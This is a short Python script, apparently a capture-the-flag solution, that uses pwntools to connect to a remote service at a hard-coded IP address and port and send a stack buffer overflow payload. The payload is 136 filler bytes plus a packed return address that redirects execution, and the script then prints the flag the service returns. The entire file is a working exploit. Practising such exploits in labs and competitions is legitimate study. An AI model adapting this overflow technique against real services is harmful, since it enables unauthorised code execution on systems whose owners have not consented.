from pwn import *
con = remote("159.65.13.76", 63003)
payload = b"A" * 136 + p64(0x40089c)
con.recvline()
con.sendline(payload)
x = con.recvline()
log.info(x)
x = con.recvline()
log.success("Flag: ", x)